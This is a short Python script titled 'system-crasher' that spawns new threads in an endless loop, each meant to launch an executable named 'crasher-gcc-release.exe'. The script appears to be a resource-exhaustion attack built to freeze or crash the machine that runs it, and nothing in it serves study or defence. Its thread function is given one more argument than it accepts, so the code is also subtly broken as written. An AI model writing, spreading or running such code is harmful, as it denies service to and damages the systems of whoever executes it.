"""
Powered By Searchstars
system-crasher Main
"""
import _thread
import os
def run(a,b):
    os.system("crasher-gcc-release.exe")
while True:
    _thread.start_new_thread( run, ("Thread-1", 2, ) )
